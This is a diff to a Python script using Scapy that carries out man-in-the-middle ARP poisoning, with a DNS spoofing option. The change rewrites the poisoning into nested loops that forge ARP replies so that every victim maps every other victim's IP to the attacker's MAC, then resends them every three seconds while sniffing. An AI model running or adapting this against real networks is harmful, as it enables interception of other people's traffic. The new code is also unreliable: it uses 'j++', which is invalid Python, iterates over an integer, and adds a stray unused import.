@@ -2,6 +2,7 @@
 # MITM ARP spoofing attack - using Scapy
 
 # Imports
+from unittest import skip
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
@@ -18,13 +19,13 @@ from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 
 # The main method to be ran by the user of our script
 def main():
-       typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
-       if (typeOfAttack == 1):
-           arp_poison()
-       elif (typeOfAttack == 2):
-           dns_spoof()
-       else:
-           print("No or wrong input.")
+    typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
+    if (typeOfAttack == 1):
+        arp_poison()
+    elif (typeOfAttack == 2):
+        dns_spoof()
+    else:
+        print("No or wrong input.")
 
 def arp_poison():
     # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
@@ -50,39 +51,42 @@ def arp_poison():
     # ipAttacker = input("The IP address of the attacker: ")
 
     
-    if (nrOfHosts == 2):
-        # Send ARP package to victim 1 of spoofed IP victim 2
-        arp1 = Ether() / ARP()
-        arp1[Ether].src = macAttacker
-        arp1[ARP].hwsrc = macAttacker
-        arp1[ARP].psrc = ipVictimList[1]
-        arp1[ARP].hwdst = macVictimList[0]
-        arp1[ARP].pdst = ipVictimList[0]
-        sendp(arp1, iface="enp0s9")
+    # Send ARP package to every victim saying that each other victim is the attacker using the spoofed MAC address of the attacker
+    # i goes through all the hosts and represents the victims that will be fooled
+    for i in nrOfHosts:
+        # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
+        for j in nrOfHosts:
+            # No need to send ARP package to itself.
+            if (i==j):
+                j++
+            arp = Ether() / ARP()
+            arp[Ether].src = macAttacker
+            arp[ARP].hwsrc = macAttacker
+            arp[ARP].psrc = ipVictimList[j] # spoofed
+            arp[ARP].hwdst = macVictimList[i] # fooled
+            arp[ARP].pdst = ipVictimList[i]
+            sendp(arp, iface="enp0s9")
+    
+    # Call sniff to start sniffing for incoming packets from victims
+    sniff(iface = "enp0s9")
 
-        # Send ARP package to victim 2 of spoofed IP victim 1
-        arp2 = Ether() / ARP()
-        arp2[Ether].src = macAttacker
-        arp2[ARP].hwsrc = macAttacker
-        arp2[ARP].psrc = ipVictimList[0]
-        arp2[ARP].hwdst = macVictimList[1]
-        arp2[ARP].pdst = ipVictimList[1]
-        sendp(arp2, iface="enp0s9")
-        
-        # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
-        sniff(iface = "enp0s9")
-
-        # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
-        while(True):
-            # Send ARP package to victim 1 of spoofed IP victim 2
-            sendp(arp1, iface="enp0s9")
-
-            # Send ARP package to victim 2 of spoofed IP victim 1
-            sendp(arp2, iface="enp0s9")
-
-            # Timer
-            time.sleep(3)
-
+    # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
+    while(True):     
+        for i in nrOfHosts:
+            # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
+            for j in nrOfHosts:
+                # No need to send ARP package to itself.
+                if (i==j):
+                    j++
+                arp = Ether() / ARP()
+                arp[Ether].src = macAttacker
+                arp[ARP].hwsrc = macAttacker
+                arp[ARP].psrc = ipVictimList[j] # spoofed
+                arp[ARP].hwdst = macVictimList[i] # fooled
+                arp[ARP].pdst = ipVictimList[i]
+                sendp(arp, iface="enp0s9")
+        # Timer
+        time.sleep(3)
 
 
 # To Do: before you are able to run this method succesfully
